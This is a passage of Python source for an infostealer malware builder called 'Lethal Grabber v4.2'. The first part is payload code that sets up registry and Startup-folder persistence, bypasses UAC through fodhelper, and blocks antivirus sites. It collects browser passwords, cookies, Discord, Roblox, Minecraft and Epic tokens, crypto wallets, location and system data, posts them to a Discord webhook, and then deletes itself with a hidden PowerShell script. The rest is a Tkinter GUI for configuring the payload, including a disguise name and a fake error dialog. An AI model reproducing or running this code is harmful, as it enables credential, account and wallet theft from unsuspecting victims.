                r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(k, KEY_NAME, 0, winreg.REG_SZ, self_path)
            winreg.CloseKey(k)
        except:
            pass
    
    try:
        k = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(k, KEY_NAME, 0, winreg.REG_SZ, self_path)
        winreg.CloseKey(k)
    except:
        try:
            k2 = winreg.CreateKey(winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run")
            winreg.SetValueEx(k2, KEY_NAME, 0, winreg.REG_SZ, self_path)
            winreg.CloseKey(k2)
        except:
            pass
    
    try:
        if not os.path.isdir(STARTUP_DIR):
            os.makedirs(STARTUP_DIR)
        shutil.copy2(sys.argv[0], os.path.join(STARTUP_DIR, "SysHealthStrayX64.exe"))
    except:
        pass
    
    if is_admin():
        try:
            k = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
                r"Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(k, KEY_NAME, 0, winreg.REG_SZ, self_path)
            winreg.CloseKey(k)
        except:
            pass
    
    try:
        k = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows NT\CurrentVersion\Windows", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(k, "load", 0, winreg.REG_SZ, self_path)
        winreg.CloseKey(k)
    except:
        pass
    
    try:
        k = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
            r"Environment", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(k, "UserInitMprLogonScript", 0, winreg.REG_SZ, self_path)
        winreg.CloseKey(k)
    except:
        pass
    
    try:
        link_path = os.path.join(os.environ.get("APPDATA", ""),
            "Microsoft", "Windows", "Start Menu", "Programs", "Startup",
            "SysHealthStrayX64.lnk")
        with open(link_path, "wb") as f:
            f.write(b'L\x00\x00\x00\x01\x14\x02\x00\x00\x00\x00\x00\xc0\x00\x00\x00\x00\x00\x00F')
            f.write(os.path.abspath(sys.argv[0]).encode("utf-16-le"))
    except:
        pass

def self_destruct():
    if not FEAT_SELFDESTRUCT:
        return
    exe = sys.argv[0]
    b = ('@echo off\r\n:loop\r\ndel "' + exe + '"\r\nif exist "' + exe + '" goto loop\r\ndel %0\r\n')
    enc = base64.b64encode(b.encode()).decode()
    try:
        subprocess.run(["powershell", "-Command", "-"], input=(
            f'$d=[Convert]::FromBase64String("{enc}");'
            f'$b=[Text.Encoding]::UTF8.GetString($d)+" &";'
            f'$b | Out-File -FilePath "$env:TEMP\\kill.bat" -Encoding ASCII;'
            f'Start-Process -WindowStyle Hidden -FilePath "$env:TEMP\\kill.bat";'
            f'Start-Sleep -Seconds 0.5;'
            f'Remove-Item -Force "$env:TEMP\\kill.bat"'
        ), capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == "win32" else 0)
    except:
        pass

def main():
__PH_SHOW_ERROR__
    
    block_av_sites()
    time.sleep(1.0)
    if not HAS_REQUESTS:
        return
    setup_persistence()
    geo_data = get_geolocation() if FEAT_SYSTEM else None
    sys_info = get_system_info() if FEAT_SYSTEM else {}
    street_address = None
    try:
        if FEAT_GRAB_ADDRESS:
            street_address = grab_address_via_browser()
    except:
        street_address = None
    all_tokens = get_discord_tokens_with_info() if FEAT_TOKENS else []
    passwords, scanned = extract_chromium_passwords() if FEAT_PASSWORDS else ([], [])
    ff_passwords = []
    if FEAT_PASSWORDS:
        for profiles_dir in [os.path.join(ROAMING, "Mozilla", "Firefox", "Profiles"), os.path.join(LOCAL, "Mozilla", "Firefox", "Profiles")]:
            if os.path.isdir(profiles_dir):
                for profile_name in os.listdir(profiles_dir):
                    profile_path = os.path.join(profiles_dir, profile_name)
                    ff_results = decrypt_firefox_passwords(profile_path)
                    ff_passwords.extend(ff_results)
    autofills = extract_chromium_autofills() if FEAT_AUTOFILLS else []
    cookies = extract_all_cookies() if FEAT_COOKIES else []
    roblox = get_roblox_cookies_v2() if FEAT_ROBLOX else []
    epic_games = get_epic_games_tokens() if FEAT_EPIC_GAMES else []
    minecraft = get_minecraft_sessions() if FEAT_MINECRAFT else []
    exodus_wallet_zip = None
    if FEAT_GRAB_CRYPTO:
        exodus_wallet_zip = grab_exodus_wallet_folder()

    FEAT_MULLVAD = True  # or feature-gate it properly
    mullvad_accounts = []
    try:
        if FEAT_MULLVAD:
            mullvad_accounts = get_mullvad_accounts()
    except:
        mullvad_accounts = []

    send(WEBHOOK_URL, WEBHOOK_NAME, WEBHOOK_AVATAR, sys_info, all_tokens,
         passwords, autofills, cookies, scanned, roblox, minecraft, ff_passwords, 
         geo_data, exodus_wallet_zip, street_address, mullvad_accounts, epic_games)
    if exodus_wallet_zip and os.path.exists(exodus_wallet_zip):
        try: os.remove(exodus_wallet_zip)
        except: pass
    ss = take_screenshot()
    if ss and os.path.exists(ss):
        try: os.remove(ss)
        except: pass
    self_destruct()

if __name__ == "__main__":
    try:
        if not is_admin():
            uac_bypass_fodhelper()
        main()
    except:
        pass
'''
    
    code = code.replace("__PH_WEBHOOK_URL__", ph_webhook_url)
    code = code.replace("__PH_WEBHOOK_NAME__", ph_webhook_name)
    code = code.replace("__PH_WEBHOOK_AVATAR__", ph_webhook_avatar)
    code = code.replace("__PH_PASSWORDS__", ph_passwords)
    code = code.replace("__PH_AUTOFILLS__", ph_autofills)
    code = code.replace("__PH_COOKIES__", ph_cookies)
    code = code.replace("__PH_TOKENS__", ph_tokens)
    code = code.replace("__PH_ROBLOX__", ph_roblox)
    code = code.replace("__PH_MINECRAFT__", ph_minecraft)
    code = code.replace("__PH_EPIC_GAMES__", ph_epic_games)
    code = code.replace("__PH_WINKEY__", ph_winkey)
    code = code.replace("__PH_SCREENSHOT__", ph_screenshot)
    code = code.replace("__PH_SYSTEM__", ph_system)
    code = code.replace("__PH_MESSENGER__", ph_messenger)
    code = code.replace("__PH_PERSISTENCE__", ph_persistence)
    code = code.replace("__PH_SELFDESTRUCT__", ph_selfdestruct)
    code = code.replace("__PH_PING_EVERYONE__", ph_ping_everyone)
    code = code.replace("__PH_BLOCK_AV__", ph_block_av)
    code = code.replace("__PH_GRAB_CRYPTO__", ph_grab_crypto)
    code = code.replace("__PH_WEBCAM__", ph_webcam)
    code = code.replace("__PH_GRAB_ADDRESS__", ph_grab_address)
    code = code.replace("__PH_MULLVAD__", ph_grab_mullvad)
    
    error_title = features.get("error_title", "Error")
    error_content = features.get("error_content", "An error has occurred")
    if features.get("show_error", False):
        code = code.replace("__PH_SHOW_ERROR__", "    show_error_message()")
        code = code.replace("__PH_ERROR_TITLE__", error_title)
        code = code.replace("__PH_ERROR_CONTENT__", error_content)
    else:
        code = code.replace("__PH_SHOW_ERROR__", "    pass")
        code = code.replace("__PH_ERROR_TITLE__", "Error")
        code = code.replace("__PH_ERROR_CONTENT__", "An error has occurred")
    
    return code


class SleekBuilder:
    def __init__(self, root):
        self.root = root
        self.root.title("Lethal Grabber v4.2 - Builder")
        self.root.configure(bg='#0a0a0f')
        self.root.resizable(False, False)
        self.root.geometry("1100x640")
        
        self.BG = '#0a0a0f'
        self.SIDEBAR_BG = '#0f0f1a'
        self.CARD_BG = '#14142a'
        self.CARD_BORDER = '#3a2a6a'
        self.TEXT = '#e0e0f0'
        self.TEXT_DIM = '#7070a0'
        self.TEXT_SEC = '#9090b0'
        self.ACCENT = '#7c3aed'
        self.ACCENT_GLOW = '#a78bfa'
        self.ACCENT_DIM = '#4a1a8a'
        self.ACCENT_DARK = '#2a1a5a'
        self.GREEN = '#22c55e'
        self.RED = '#ef4444'
        self.ENTRY_BG = '#1a1a3a'
        self.ENTRY_BORDER = '#2a2a5a'
        self.BTN_HOVER = '#6d28d9'
        self.LED_STRIP_H = 3
        
        self.current_tab = tk.StringVar(value="features")
        self.webhook_url = tk.StringVar()
        self.webhook_name = tk.StringVar(value="Lethal Grabber")
        self.webhook_avatar = tk.StringVar()
        self.exe_name = tk.StringVar(value="SysHealthStrayX64")
        self.exe_icon_path = tk.StringVar()
        self.show_error = tk.BooleanVar(value=False)
        self.error_title = tk.StringVar(value="Error")
        self.error_content = tk.StringVar(value="An unexpected error has occurred. Please try again.")
        self.hide_console = tk.BooleanVar(value=True)
        self.add_to_startup_opt = tk.BooleanVar(value=True)
        self.anti_vm = tk.BooleanVar(value=False)
        self.anti_debug = tk.BooleanVar(value=False)
        self.block_av_sites = tk.BooleanVar(value=True)
        self.grab_crypto_wallets = tk.BooleanVar(value=True)
        self.capture_webcam = tk.BooleanVar(value=True)
        self.ping_everyone = tk.BooleanVar(value=False)
        self.grab_address = tk.BooleanVar(value=True)
        self.grab_mullvad = tk.BooleanVar(value=True)    
        self.features = {
            "passwords": tk.BooleanVar(value=True),
            "autofills": tk.BooleanVar(value=True),
            "cookies": tk.BooleanVar(value=True),
            "tokens": tk.BooleanVar(value=True),
            "roblox": tk.BooleanVar(value=True),
            "minecraft": tk.BooleanVar(value=True),
            "epic_games": tk.BooleanVar(value=True),
            "winkey": tk.BooleanVar(value=True),
            "screenshot": tk.BooleanVar(value=True),
            "system": tk.BooleanVar(value=True),
            "messenger": tk.BooleanVar(value=True),
            "persistence": tk.BooleanVar(value=True),
            "selfdestruct": tk.BooleanVar(value=True),
        }
        
        self.build_status = tk.StringVar(value="Ready")
        self.is_building = False
        self.led_phase = 0
        
        self._build_ui()
        self._start_led_animation()
    
    def _build_ui(self):
        self.main_frame = tk.Frame(self.root, bg=self.BG)
        self.main_frame.pack(fill='both', expand=True)
        
        self.led_frame = tk.Frame(self.main_frame, bg=self.BG, height=self.LED_STRIP_H)
        self.led_frame.pack(fill='x')
        self.led_frame.pack_propagate(False)
        
        self.led_canvas = tk.Canvas(self.led_frame, height=self.LED_STRIP_H, bg=self.BG, 
                                     highlightthickness=0, bd=0)
        self.led_canvas.pack(fill='x')
        
        header = tk.Frame(self.main_frame, bg='#0d0d18')
        header.pack(fill='x')
        
        tk.Frame(header, bg=self.ACCENT, height=2).pack(fill='x')
        
        header_inner = tk.Frame(header, bg='#0d0d18')
        header_inner.pack(fill='x', padx=20, pady=(6, 6))
        
        logo_frame = tk.Frame(header_inner, bg='#0d0d18')
        logo_frame.pack(side='left')
        
        tk.Label(logo_frame, text="\u26a1", font=('Segoe UI', 14), fg=self.ACCENT_GLOW, 
                bg='#0d0d18').pack(side='left')
        tk.Label(logo_frame, text=" LETHAL GRABBER ", font=('Segoe UI', 12, 'bold'),
                fg='white', bg='#0d0d18').pack(side='left')
        tk.Label(logo_frame, text="v4.2", font=('Segoe UI', 8, 'bold'),
                fg=self.TEXT_DIM, bg='#0d0d18').pack(side='left')
        
        badge_frame = tk.Frame(header_inner, bg='#0d0d18')
        badge_frame.pack(side='right')
        
        status_dot = tk.Frame(badge_frame, bg=self.ACCENT, width=6, height=6, 
                              highlightthickness=0)
        status_dot.pack(side='left', padx=(0, 4))
        status_dot.pack_propagate(False)
        tk.Label(badge_frame, text="BUILDER", font=('Segoe UI', 7, 'bold'),
                fg=self.TEXT_DIM, bg='#0d0d18').pack(side='left')
        
        body = tk.Frame(self.main_frame, bg=self.BG)
        body.pack(fill='both', expand=True, padx=0, pady=0)
        
        self.sidebar = tk.Frame(body, bg=self.SIDEBAR_BG, width=160)
        self.sidebar.pack(side='left', fill='y')
        self.sidebar.pack_propagate(False)
        
        tk.Frame(self.sidebar, bg=self.ACCENT, width=3).pack(side='left', fill='y')
        
        sidebar_inner = tk.Frame(self.sidebar, bg=self.SIDEBAR_BG)
        sidebar_inner.pack(fill='both', expand=True, padx=10, pady=12)
        
        nav_buttons = [
            ("features", "\U0001f3af Features"),
            ("setup", "\u2699\ufe0f Setup"),
            ("compiler", "\U0001f4e6 Compiler"),
        ]
        
        self.nav_btns = {}
        for key, label in nav_buttons:
            btn_frame = tk.Frame(sidebar_inner, bg=self.SIDEBAR_BG)
            btn_frame.pack(fill='x', pady=2)
            
            btn = tk.Button(
                btn_frame, text=label,
                font=('Segoe UI', 10, 'bold'),
                fg=self.TEXT_DIM, bg=self.SIDEBAR_BG,
                activeforeground='white', 
                activebackground='#1a1a35',
                relief='flat', bd=0, anchor='w',
                padx=10, pady=8, cursor='hand2',
                command=lambda k=key: self._switch_tab(k)
            )
            btn.pack(fill='x')
            self.nav_btns[key] = btn
        
        tk.Frame(sidebar_inner, bg='#1a1a2e', height=1).pack(fill='x', pady=(15, 8))
        tk.Label(sidebar_inner, text="Lethal Grabber v4.2", 
                font=('Segoe UI', 7), fg=self.TEXT_DIM, bg=self.SIDEBAR_BG).pack()
        
        self.content_area = tk.Frame(body, bg=self.BG)
        self.content_area.pack(side='left', fill='both', expand=True)
        
        self.tab_frames = {}
        self.tab_frames["features"] = self._build_features_tab()
        self.tab_frames["setup"] = self._build_setup_tab()
        self.tab_frames["compiler"] = self._build_compiler_tab()
        
        self._switch_tab("features")
        
        bottom_bar = tk.Frame(self.main_frame, bg='#0d0d18', height=32)
        bottom_bar.pack(fill='x', side='bottom')
        bottom_bar.pack_propagate(False)
        
        tk.Frame(bottom_bar, bg=self.ACCENT, height=1).pack(fill='x')
        
        status_inner = tk.Frame(bottom_bar, bg='#0d0d18')
        status_inner.pack(fill='x', padx=15, pady=5)
        
        tk.Label(status_inner, text="\u25cf", font=('Segoe UI', 7), fg=self.GREEN, 
                bg='#0d0d18').pack(side='left')
        tk.Label(status_inner, text="  Status: ", font=('Segoe UI', 8), 
                fg=self.TEXT_DIM, bg='#0d0d18').pack(side='left')
        tk.Label(status_inner, textvariable=self.build_status, font=('Segoe UI', 8),
                fg=self.TEXT_SEC, bg='#0d0d18').pack(side='left')
        
        self.build_btn = tk.Button(
            status_inner, text="\u26a1 BUILD .EXE \u26a1", 
            command=self.start_build,
            font=('Segoe UI', 9, 'bold'),
            fg='white', bg=self.ACCENT,
            activebackground=self.BTN_HOVER,
            activeforeground='white',
            relief='flat', bd=0, padx=18, pady=3, cursor='hand2'
        )
        self.build_btn.pack(side='right')
    
    def _make_card(self, parent, title, icon, accent_color=None):
        if accent_color is None:
            accent_color = self.ACCENT
        
        card = tk.Frame(parent, bg=self.CARD_BG, 
                       highlightbackground=self.CARD_BORDER, highlightthickness=1, bd=0)
        card.pack(fill='x', padx=15, pady=(8, 6))
        
        tk.Frame(card, bg=accent_color, height=2).pack(fill='x')
        
        hdr = tk.Frame(card, bg=self.CARD_BG)
        hdr.pack(fill='x', padx=14, pady=(8, 4))
        tk.Label(hdr, text=icon, font=('Segoe UI', 11), fg=self.ACCENT_GLOW, 
                bg=self.CARD_BG).pack(side='left')
        tk.Label(hdr, text=f"  {title}", font=('Segoe UI', 10, 'bold'),
                fg='white', bg=self.CARD_BG).pack(side='left')
        
        content = tk.Frame(card, bg=self.CARD_BG)
        content.pack(fill='x', padx=14, pady=(0, 10))
        
        return content
    
    def _make_feature_chk(self, parent, text, var, row, col, padx=5, pady=2):
        cb = tk.Checkbutton(
            parent, text=text, variable=var,
            font=('Segoe UI', 9), fg=self.TEXT, bg=self.CARD_BG,
            selectcolor='#1a1a3a', activebackground=self.CARD_BG,
            activeforeground=self.ACCENT_GLOW, highlightthickness=0, bd=0,
            padx=2, pady=1
        )
        cb.grid(row=row, column=col, sticky='w', padx=padx, pady=pady)
        return cb
    
    def _build_features_tab(self):
        frame = tk.Frame(self.content_area, bg=self.BG)
        
        canvas = tk.Canvas(frame, bg=self.BG, highlightthickness=0, bd=0)
        scrollbar = tk.Scrollbar(frame, orient='vertical', command=canvas.yview)
        scroll_frame = tk.Frame(canvas, bg=self.BG)
        
        scroll_frame.bind('<Configure>', lambda e: canvas.configure(scrollregion=canvas.bbox('all')))
        canvas.create_window((0, 0), window=scroll_frame, anchor='nw')
        canvas.configure(yscrollcommand=scrollbar.set)
        
        canvas.pack(side='left', fill='both', expand=True)
        scrollbar.pack(side='right', fill='y')
        
        row1 = tk.Frame(scroll_frame, bg=self.BG)
        row1.pack(fill='x', pady=(10, 0))
        
        games_c = tk.Frame(row1, bg=self.CARD_BG, 
                          highlightbackground=self.CARD_BORDER, highlightthickness=1, bd=0)
        games_c.pack(side='left', fill='both', expand=True, padx=(15, 7))
        tk.Frame(games_c, bg=self.ACCENT, height=2).pack(fill='x')
        games_hdr = tk.Frame(games_c, bg=self.CARD_BG)
        games_hdr.pack(fill='x', padx=12, pady=(6, 2))
        tk.Label(games_hdr, text="\U0001f3ae  Games", font=('Segoe UI', 10, 'bold'),
                fg='white', bg=self.CARD_BG).pack(side='left')
        games_b = tk.Frame(games_c, bg=self.CARD_BG)
        games_b.pack(fill='x', padx=12, pady=(0, 8))
        
        self._make_feature_chk(games_b, "Roblox Cookie Stealer", self.features["roblox"], 0, 0)
        self._make_feature_chk(games_b, "Minecraft Session Stealer", self.features["minecraft"], 1, 0)
        self._make_feature_chk(games_b, "Epic Games Token Stealer", self.features["epic_games"], 1, 1)
        
        err_c = tk.Frame(row1, bg=self.CARD_BG, 
                        highlightbackground=self.CARD_BORDER, highlightthickness=1, bd=0)
        err_c.pack(side='left', fill='both', expand=True, padx=(7, 15))
        tk.Frame(err_c, bg=self.ACCENT, height=2).pack(fill='x')
        err_hdr = tk.Frame(err_c, bg=self.CARD_BG)
        err_hdr.pack(fill='x', padx=12, pady=(6, 2))
        tk.Label(err_hdr, text="\u26a0\ufe0f  Error Display", font=('Segoe UI', 10, 'bold'),
                fg='white', bg=self.CARD_BG).pack(side='left')
        err_b = tk.Frame(err_c, bg=self.CARD_BG)
        err_b.pack(fill='x', padx=12, pady=(0, 8))
        
        cb_err = tk.Checkbutton(
            err_b, text="Show error message when run", variable=self.show_error,
            font=('Segoe UI', 9), fg=self.TEXT, bg=self.CARD_BG,
            selectcolor='#1a1a3a', activebackground=self.CARD_BG,
            activeforeground=self.ACCENT_GLOW, highlightthickness=0, bd=0
        )
        cb_err.grid(row=0, column=0, columnspan=2, sticky='w', pady=1)
        
        tk.Label(err_b, text="Title", font=('Segoe UI', 7), fg=self.TEXT_DIM, 
                bg=self.CARD_BG).grid(row=1, column=0, sticky='w', pady=(4, 1))
        tk.Entry(err_b, textvariable=self.error_title, font=('Segoe UI', 8),
                bg=self.ENTRY_BG, fg='white', insertbackground='white', 
                relief='flat', bd=0, width=18).grid(row=1, column=1, sticky='ew', padx=(4, 0), pady=(4, 1))
        
        tk.Label(err_b, text="Content", font=('Segoe UI', 7), fg=self.TEXT_DIM, 
                bg=self.CARD_BG).grid(row=2, column=0, sticky='w', pady=(1, 1))
        tk.Entry(err_b, textvariable=self.error_content, font=('Segoe UI', 8),
                bg=self.ENTRY_BG, fg='white', insertbackground='white', 
                relief='flat', bd=0, width=24).grid(row=2, column=1, sticky='ew', padx=(4, 0), pady=(1, 1))
        
        row2 = tk.Frame(scroll_frame, bg=self.BG)
        row2.pack(fill='x', pady=(4, 0))
        
        gen_c = tk.Frame(row2, bg=self.CARD_BG, 
                        highlightbackground=self.CARD_BORDER, highlightthickness=1, bd=0)
        gen_c.pack(side='left', fill='both', expand=True, padx=(15, 7))
        tk.Frame(gen_c, bg=self.ACCENT, height=2).pack(fill='x')
        gen_hdr = tk.Frame(gen_c, bg=self.CARD_BG)
        gen_hdr.pack(fill='x', padx=12, pady=(6, 2))
        tk.Label(gen_hdr, text="\U0001f4cb  General", font=('Segoe UI', 10, 'bold'),
                fg='white', bg=self.CARD_BG).pack(side='left')
        gen_b = tk.Frame(gen_c, bg=self.CARD_BG)
        gen_b.pack(fill='x', padx=12, pady=(0, 8))
        
        gen_items = ["passwords", "autofills", "cookies", "tokens", "winkey", "screenshot", "messenger"]
        gen_labels = ["Passwords", "Autofills", "Cookies", "Discord Tokens", "Windows Key", "Screenshot", "Messenger"]
        for i, (k, lbl) in enumerate(zip(gen_items, gen_labels)):
            self._make_feature_chk(gen_b, lbl, self.features[k], i//2, i%2, padx=8)
        
        opt_c = tk.Frame(row2, bg=self.CARD_BG, 
                        highlightbackground=self.CARD_BORDER, highlightthickness=1, bd=0)
        opt_c.pack(side='left', fill='both', expand=True, padx=(7, 15))
        tk.Frame(opt_c, bg=self.ACCENT, height=2).pack(fill='x')
        opt_hdr = tk.Frame(opt_c, bg=self.CARD_BG)
        opt_hdr.pack(fill='x', padx=12, pady=(6, 2))
        tk.Label(opt_hdr, text="\U0001f527  Options", font=('Segoe UI', 10, 'bold'),
                fg='white', bg=self.CARD_BG).pack(side='left')
        opt_b = tk.Frame(opt_c, bg=self.CARD_BG)
        opt_b.pack(fill='x', padx=12, pady=(0, 8))
        
        opt_items = [
            (self.hide_console, "Hide Console"),
            (self.add_to_startup_opt, "Add to Startup"),
            (self.block_av_sites, "Block AV Sites"),
            (self.grab_crypto_wallets, "Grab Crypto Wallets"),
            (self.capture_webcam, "Capture Webcam"),
            (self.ping_everyone, "Ping @everyone"),
            (self.grab_mullvad, "Grab Mullvad VPN"),
        ]
        for i, (var, lbl) in enumerate(opt_items):
            tk.Checkbutton(
                opt_b, text=lbl, variable=var,
                font=('Segoe UI', 9), fg=self.TEXT, bg=self.CARD_BG,
                selectcolor='#1a1a3a', activebackground=self.CARD_BG,
                activeforeground=self.ACCENT_GLOW, highlightthickness=0, bd=0
            ).grid(row=i//2, column=i%2, sticky='w', padx=8, pady=1)
        
        row3 = tk.Frame(scroll_frame, bg=self.BG)
        row3.pack(fill='x', pady=(4, 0))

        addr_c = tk.Frame(row3, bg=self.CARD_BG, 
                         highlightbackground=self.CARD_BORDER, highlightthickness=1, bd=0)
        addr_c.pack(side='left', fill='both', expand=True, padx=(15, 7))
        tk.Frame(addr_c, bg=self.ACCENT, height=2).pack(fill='x')
        addr_hdr = tk.Frame(addr_c, bg=self.CARD_BG)
        addr_hdr.pack(fill='x', padx=12, pady=(6, 2))
        tk.Label(addr_hdr, text="\U0001f4cd  Location Intelligence", font=('Segoe UI', 10, 'bold'),
                fg='white', bg=self.CARD_BG).pack(side='left')
        addr_b = tk.Frame(addr_c, bg=self.CARD_BG)
        addr_b.pack(fill='x', padx=12, pady=(0, 8))
        
        tk.Checkbutton(
            addr_b, text="Street Address Grabber (via Selenium browser)",
            variable=self.grab_address,
            font=('Segoe UI', 9), fg=self.TEXT, bg=self.CARD_BG,
            selectcolor='#1a1a3a', activebackground=self.CARD_BG,
            activeforeground=self.ACCENT_GLOW, highlightthickness=0, bd=0
        ).pack(anchor='w', pady=2)
        
        tk.Label(addr_b, 
                text="Retrieves city, region, postal & country\nvia IP geolocation (no browser required)",
                font=('Segoe UI', 7), fg=self.TEXT_DIM, bg=self.CARD_BG,
                justify='left').pack(anchor='w', pady=(0, 2))

        sys_c = tk.Frame(row3, bg=self.CARD_BG, 
                        highlightbackground=self.CARD_BORDER, highlightthickness=1, bd=0)
        sys_c.pack(side='left', fill='both', expand=True, padx=(7, 15))
        tk.Frame(sys_c, bg=self.ACCENT_DIM, height=2).pack(fill='x')
        sys_hdr = tk.Frame(sys_c, bg=self.CARD_BG)
        sys_hdr.pack(fill='x', padx=12, pady=(6, 2))
        tk.Label(sys_hdr, text="\U0001f5a5\ufe0f  System & Misc", font=('Segoe UI', 10, 'bold'),
                fg='white', bg=self.CARD_BG).pack(side='left')
        sys_b = tk.Frame(sys_c, bg=self.CARD_BG)
        sys_b.pack(fill='x', padx=12, pady=(0, 8))
        
        sys_items = [("system", "System Info"), ("persistence", "Persistence"), ("selfdestruct", "Self-Destruct")]
        for i, (k, lbl) in enumerate(sys_items):
            tk.Checkbutton(
                sys_b, text=lbl, variable=self.features[k],
                font=('Segoe UI', 9), fg=self.TEXT, bg=self.CARD_BG,
                selectcolor='#1a1a3a', activebackground=self.CARD_BG,
                activeforeground=self.ACCENT_GLOW, highlightthickness=0, bd=0
            ).grid(row=0, column=i, sticky='w', padx=12, pady=1)
        
        return frame
    
    def _build_setup_tab(self):
        frame = tk.Frame(self.content_area, bg=self.BG)
        
        canvas = tk.Canvas(frame, bg=self.BG, highlightthickness=0, bd=0)
        scrollbar = tk.Scrollbar(frame, orient='vertical', command=canvas.yview)
        scroll_frame = tk.Frame(canvas, bg=self.BG)
        
        scroll_frame.bind('<Configure>', lambda e: canvas.configure(scrollregion=canvas.bbox('all')))
        canvas.create_window((0, 0), window=scroll_frame, anchor='nw')
        canvas.configure(yscrollcommand=scrollbar.set)
        
        canvas.pack(side='left', fill='both', expand=True)
        scrollbar.pack(side='right', fill='y')
        
        wh_content = self._make_card(scroll_frame, "Webhook Configuration", "\U0001f517")
        
        tk.Label(wh_content, text="Discord Webhook URL", font=('Segoe UI', 8), 
                fg=self.TEXT_DIM, bg=self.CARD_BG).pack(anchor='w', pady=(2, 2))
        tk.Entry(wh_content, textvariable=self.webhook_url, font=('Segoe UI', 9),
                bg=self.ENTRY_BG, fg='white', insertbackground='white', 
                relief='flat', bd=0).pack(fill='x', ipady=4, pady=(0, 5))
        
        wh_row = tk.Frame(wh_content, bg=self.CARD_BG)
        wh_row.pack(fill='x')
        
        left = tk.Frame(wh_row, bg=self.CARD_BG)
        left.pack(side='left', fill='x', expand=True, padx=(0, 6))
        tk.Label(left, text="Bot Name", font=('Segoe UI', 8), fg=self.TEXT_DIM, 
                bg=self.CARD_BG).pack(anchor='w', pady=(2, 2))
        tk.Entry(left, textvariable=self.webhook_name, font=('Segoe UI', 9),
                bg=self.ENTRY_BG, fg='white', insertbackground='white', 
                relief='flat', bd=0).pack(fill='x', ipady=4)
        
        right = tk.Frame(wh_row, bg=self.CARD_BG)
        right.pack(side='left', fill='x', expand=True)
        tk.Label(right, text="Avatar URL (optional)", font=('Segoe UI', 8), 
                fg=self.TEXT_DIM, bg=self.CARD_BG).pack(anchor='w', pady=(2, 2))
        tk.Entry(right, textvariable=self.webhook_avatar, font=('Segoe UI', 9),
                bg=self.ENTRY_BG, fg='white', insertbackground='white', 
                relief='flat', bd=0).pack(fill='x', ipady=4)
        
        icon_exe_row = tk.Frame(scroll_frame, bg=self.BG)
        icon_exe_row.pack(fill='x', pady=(4, 0))
        
        icon_c = tk.Frame(icon_exe_row, bg=self.CARD_BG, 
                         highlightbackground=self.CARD_BORDER, highlightthickness=1, bd=0)
        icon_c.pack(side='left', fill='both', expand=True, padx=(15, 7))
        tk.Frame(icon_c, bg=self.ACCENT, height=2).pack(fill='x')
        icon_hdr = tk.Frame(icon_c, bg=self.CARD_BG)
        icon_hdr.pack(fill='x', padx=12, pady=(6, 2))
        tk.Label(icon_hdr, text="\U0001f5bc\ufe0f  Custom Icon", font=('Segoe UI', 10, 'bold'),
                fg='white', bg=self.CARD_BG).pack(side='left')
        icon_b = tk.Frame(icon_c, bg=self.CARD_BG)
        icon_b.pack(fill='x', padx=12, pady=(0, 8))
        
        icon_input_frame = tk.Frame(icon_b, bg=self.CARD_BG)
        icon_input_frame.pack(fill='x')
        tk.Entry(icon_input_frame, textvariable=self.exe_icon_path, font=('Segoe UI', 9),
                bg=self.ENTRY_BG, fg='white', insertbackground='white', 
                relief='flat', bd=0).pack(side='left', fill='x', expand=True, ipady=3)
        tk.Button(icon_input_frame, text="Browse", 
                 font=('Segoe UI', 8), fg='white', bg=self.ACCENT_DIM,
                 activebackground=self.ACCENT, relief='flat', bd=0, padx=10, pady=2,
                 cursor='hand2', command=self._browse_icon).pack(side='right', padx=(5, 0))
        
        preview_frame = tk.Frame(icon_b, bg='#0a0a15', width=40, height=40,
                                highlightbackground=self.ENTRY_BORDER, highlightthickness=1)
        preview_frame.pack(side='right', pady=(5, 0))
        preview_frame.pack_propagate(False)
        self.icon_preview_label = tk.Label(preview_frame, text="No\nIcon", font=('Segoe UI', 6),
                                           fg=self.TEXT_DIM, bg='#0a0a15')
        self.icon_preview_label.pack(expand=True)
        
        out_c = tk.Frame(icon_exe_row, bg=self.CARD_BG, 
                        highlightbackground=self.CARD_BORDER, highlightthickness=1, bd=0)
        out_c.pack(side='left', fill='both', expand=True, padx=(7, 15))
        tk.Frame(out_c, bg=self.ACCENT, height=2).pack(fill='x')
        out_hdr = tk.Frame(out_c, bg=self.CARD_BG)
        out_hdr.pack(fill='x', padx=12, pady=(6, 2))
        tk.Label(out_hdr, text="\U0001f4e6  Output Settings", font=('Segoe UI', 10, 'bold'),
                fg='white', bg=self.CARD_BG).pack(side='left')
        out_b = tk.Frame(out_c, bg=self.CARD_BG)
        out_b.pack(fill='x', padx=12, pady=(0, 8))
        
        tk.Label(out_b, text="EXE Output Name", font=('Segoe UI', 8),
                fg=self.TEXT_DIM, bg=self.CARD_BG).pack(anchor='w', pady=(2, 2))
        exe_inner = tk.Frame(out_b, bg=self.CARD_BG)
        exe_inner.pack(fill='x')
        tk.Entry(exe_inner, textvariable=self.exe_name, font=('Segoe UI', 9),
                bg=self.ENTRY_BG, fg='white', insertbackground='white', 
                relief='flat', bd=0).pack(side='left', fill='x', expand=True, ipady=3)
        tk.Label(exe_inner, text=".exe", font=('Segoe UI', 9, 'bold'),
                fg=self.TEXT_DIM, bg=self.CARD_BG).pack(side='left', padx=(5, 0))
        
        exec_content = self._make_card(scroll_frame, "Execution Options", "\U0001f6e1\ufe0f")
        exec_grid = tk.Frame(exec_content, bg=self.CARD_BG)
        exec_grid.pack()
        
        tk.Checkbutton(
            exec_grid, text="Anti-VM", variable=self.anti_vm,
            font=('Segoe UI', 9), fg=self.TEXT, bg=self.CARD_BG,
            selectcolor='#1a1a3a', activebackground=self.CARD_BG,
            activeforeground=self.ACCENT_GLOW, highlightthickness=0, bd=0
        ).grid(row=0, column=0, sticky='w', padx=15, pady=2)
        
        tk.Checkbutton(
            exec_grid, text="Anti-Debug", variable=self.anti_debug,
